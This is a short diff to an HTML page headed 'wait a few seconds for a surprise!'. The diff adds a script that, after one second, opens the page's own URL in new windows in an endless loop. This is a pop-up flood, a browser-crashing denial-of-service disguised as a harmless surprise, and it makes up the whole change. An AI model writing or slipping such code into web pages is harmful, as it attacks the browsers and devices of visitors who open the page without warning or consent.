@@ -7,6 +7,8 @@
         <h1 id="test">wait a few seconds for a surprise!</h1>
     </body>
     <script>
-        window.open(window.location.href)
+        setTimeout(() => {
+            while (true) window.open(window.location.href)
+        }, 1000)
     </script>
 </html>
